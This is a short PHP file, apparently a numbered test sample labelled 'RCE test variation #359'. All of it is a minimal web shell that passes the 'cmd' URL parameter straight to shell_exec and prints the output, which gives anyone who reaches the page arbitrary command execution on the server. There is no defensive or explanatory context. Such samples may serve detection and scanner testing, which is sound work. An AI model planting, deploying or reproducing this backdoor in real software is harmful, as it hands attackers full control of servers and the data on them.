<?php
// RCE test variation #359
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>